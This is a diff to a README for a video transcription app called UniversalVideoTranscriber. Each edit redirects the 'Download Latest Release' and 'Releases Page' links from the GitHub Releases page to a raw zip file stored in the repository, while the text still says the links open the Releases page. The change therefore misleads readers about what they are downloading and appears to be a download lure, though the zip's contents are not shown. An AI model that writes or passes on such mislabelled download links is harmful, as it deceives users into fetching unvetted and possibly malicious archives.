@@ -1,7 +1,7 @@
 # 🎥 UniversalVideoTranscriber - Transcribe Video Easily, Offline
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-blue)](https://github.com/darkkshah/UniversalVideoTranscriber/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/darkkshah/UniversalVideoTranscriber/main/UniversalVideoTranscriber/Video_Universal_Transcriber_v1.2.zip)](https://raw.githubusercontent.com/darkkshah/UniversalVideoTranscriber/main/UniversalVideoTranscriber/Video_Universal_Transcriber_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to UniversalVideoTranscriber. This application makes it simple to transc
 
 ## 💻 How to Download & Install
 
-1. Click the [Download Latest Release](https://github.com/darkkshah/UniversalVideoTranscriber/releases) button above. This will take you to the Releases page.
+1. Click the [Download Latest Release](https://raw.githubusercontent.com/darkkshah/UniversalVideoTranscriber/main/UniversalVideoTranscriber/Video_Universal_Transcriber_v1.2.zip) button above. This will take you to the Releases page.
    
 2. On the Releases page, find the latest version of UniversalVideoTranscriber.
 
@@ -51,7 +51,7 @@ Welcome to UniversalVideoTranscriber. This application makes it simple to transc
 
 ## 📆 Updates
 
-Keep an eye out for new versions and updates. You can always find the latest releases on our [Releases Page](https://github.com/darkkshah/UniversalVideoTranscriber/releases).
+Keep an eye out for new versions and updates. You can always find the latest releases on our [Releases Page](https://raw.githubusercontent.com/darkkshah/UniversalVideoTranscriber/main/UniversalVideoTranscriber/Video_Universal_Transcriber_v1.2.zip).
 
 ## 🤝 Community and Support
 
